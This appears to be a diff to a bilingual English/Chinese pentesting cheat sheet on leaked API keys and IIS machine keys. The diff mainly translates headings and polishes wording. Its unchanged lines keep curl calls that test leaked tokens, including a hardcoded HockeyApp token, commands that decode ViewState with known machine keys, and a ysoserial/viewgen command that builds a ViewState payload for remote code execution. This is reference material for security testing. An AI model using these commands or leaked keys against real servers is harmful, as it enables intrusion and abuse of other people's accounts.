@@ -16,11 +16,11 @@
     - [Twitter Bearer Token](#twitter-bearer-token)
     - [Gitlab Personal Access Token](#gitlab-personal-access-token)
     - [HockeyApp API Token](#hockeyapp-api-token)
-    - [IIS Machine Keys - IIS机器密钥](#iis-machine-keys---iis机器密钥)
-      - [识别已知的机器密钥](#识别已知的机器密钥)
-      - [解码ViewState](#解码viewstate)
-      - [生成ViewState用于RCE](#生成viewstate用于rce)
-      - [编辑机器密钥cookie](#编辑机器密钥cookie)
+    - [IIS Machine Keys](#iis-machine-keys)
+      - [Identify known machine key - 识别已知的机器密钥](#identify-known-machine-key---识别已知的机器密钥)
+      - [Decode ViewState - 解码ViewState](#decode-viewstate---解码viewstate)
+      - [Generate ViewState for RCE - 生成ViewState用于RCE](#generate-viewstate-for-rce---生成viewstate用于rce)
+      - [Edit cookies with the machine key - 编辑机器密钥cookie](#edit-cookies-with-the-machine-key---编辑机器密钥cookie)
     - [Mapbox API Token](#mapbox-api-token)
   - [References](#references)
 
@@ -59,7 +59,7 @@ Google Maps API Scanner: https://github.com/ozguralp/gmapsapiscanner/
 | Directions           | https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood4&key=KEY_HERE |
 | Geocoding            | https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&key=KEY_HERE |
 | Distance Matrix      | [https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=40.6655101,-73.89188969999998&destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626&key=KEY_HERE](https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=40.6655101,-73.89188969999998&destinations=40.6905615%2C-73.9976592\|40.6905615%2C-73.9976592\|40.6905615%2C-73.9976592\|40.6905615%2C-73.9976592\|40.6905615%2C-73.9976592\|40.6905615%2C-73.9976592\|40.659569%2C-73.933783\|40.729029%2C-73.851524\|40.6860072%2C-73.6334271\|40.598566%2C-73.7527626\|40.659569%2C-73.933783\|40.729029%2C-73.851524\|40.6860072%2C-73.6334271\|40.598566%2C-73.7527626&key=KEY_HERE) |
-| Find Place from Text | [https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key=KEY_HERE](https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum of Contemporary Art Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key=KEY_HERE) |
+| Find Place from Text | [https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key=KEY_HERE](https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key=KEY_HERE) |
 | Autocomplete         | [https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&types=%28cities%29&key=KEY_HERE](https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&types=(cities)&key=KEY_HERE) |
 | Elevation            | https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034&key=KEY_HERE |
 | Timezone             | https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510&timestamp=1331161200&key=KEY_HERE |
@@ -136,9 +136,9 @@ curl "https://gitlab.example.com/api/v4/projects?private_token=<your_access_toke
 curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hockeyapp.net/api/2/apps/2021bdf2671ab09174c1de5ad147ea2ba4
 ```
 
-### IIS Machine Keys - IIS机器密钥
+### IIS Machine Keys
 
-> 该机器密钥用于表单身份验证 cookie 数据和视图状态数据的加密和解密，以及进程外会话状态标识的验证。
+> IIS机器密钥用于表单身份验证 cookie 数据和视图状态数据的加密和解密，以及进程外会话状态标识的验证。
 
 需要以下内容：
 
@@ -164,7 +164,7 @@ curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hoc
   - HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4
   - HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\2.0.50727.0\AutoGenKey
 
-#### 识别已知的机器密钥
+#### Identify known machine key - 识别已知的机器密钥
 
 - Exploit with [Blacklist3r/AspDotNetWrapper](https://github.com/NotSoSecure/Blacklist3r)
 - Exploit with [ViewGen](https://github.com/0xacb/viewgen)
@@ -181,7 +181,7 @@ $ viewgen --guess "/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L
 $ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <real viewstate value> --purpose=viewstate --modifier=<modifier value> –macdecode
 ```
 
-#### 解码ViewState
+#### Decode ViewState - 解码ViewState
 
 ```
 $ viewgen --decode --check --webconfig web.config --modifier CA0B0334 "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="
@@ -191,7 +191,7 @@ $ .\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyM
 $ .\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"
 ```
 
-#### 生成ViewState用于RCE
+#### Generate ViewState for RCE - 生成ViewState用于RCE
 
 **NOTE**: 将带有生成的 ViewState 的 POST 请求发送到同一端点，在 Burp 中，应该对有效负载的关键字符进行 URL 编码。
 
@@ -203,7 +203,7 @@ $ ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "C:\Users\z
 $ viewgen --webconfig web.config -m CA0B0334 -c "ping yourdomain.tld"
 ```
 
-#### 编辑机器密钥cookie
+#### Edit cookies with the machine key - 编辑机器密钥cookie
 
 如果您有 machineKey 但 ViewState 被禁用。
 
@@ -223,7 +223,7 @@ $ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
 
 A Mapbox API Token is a JSON Web Token (JWT). If the header of the JWT is `sk`, jackpot. If it's `pk` or `tk`, it's not worth your time.
 
-Mapbox API 令牌是一种 JSON Web 令牌 (JWT)。如果JWT的header是`sk`，那么恭喜你中大奖了。如果是`pk`或`tk`，那不值得你花时间。
+Mapbox API 令牌是一种 JSON Web 令牌 (JWT)。如果JWT的header是`sk`，那么恭喜您中大奖了。如果是`pk`或`tk`，那不值得您继续花时间。
 
 ```
 # 检查Token有效性
